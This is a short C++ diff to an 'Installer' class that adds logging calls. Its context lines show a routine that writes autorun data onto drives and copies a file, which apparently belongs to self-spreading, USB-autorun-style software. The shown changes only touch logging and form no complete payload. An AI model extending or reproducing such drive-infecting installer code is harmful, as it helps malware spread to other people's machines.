@@ -1,7 +1,8 @@
 #include "stdafx.h"
 #include "Installer.h"
-#include "Util.h"
+#include "Logger.h"
 #include "Settings.h"
+#include "Util.h"
 
 Installer installer;
 
@@ -90,6 +91,7 @@ bool Installer::InstallOnDrive(const TCHAR* drive)
 
 	DWORD written;
 	bool ret = TRUE == WriteFile(hFile, autorunData, autorunBytes, &written, NULL);
+	VLog(LMESSAGE, target);
 
 	CloseHandle(hFile);
 	return ret;
@@ -108,7 +110,7 @@ bool Installer::CopyTo(const TCHAR* path)
 	}
 	else
 	{
-		Error(_T("Failed to copy file"));
+		VLog(LNOTICE, "Failed to copy file");
 		return false;
 	}
 }
